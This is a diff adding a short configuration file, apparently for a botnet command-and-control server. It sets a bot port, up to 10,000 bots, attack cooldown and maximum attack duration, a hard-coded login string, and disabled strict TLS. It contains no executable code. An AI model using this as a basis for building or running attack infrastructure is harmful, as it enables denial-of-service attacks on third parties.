@@ -1,0 +1,18 @@
+[server]
+user_port = 1420
+bot_port = 7002
+enable_tls = true
+cert_path = "cert.pem"
+key_path = "key.pem"
+deployment_mode = "local"
+login_magic_string = "loginforme"
+strict_tls = false
+
+[limits]
+max_bots = 10000
+session_timeout_secs = 3600
+attack_cooldown_secs = 60
+max_attack_duration_secs = 300
+handshake_timeout_secs = 10
+bot_auth_timeout_secs = 5
+rate_limit_per_minute = 10
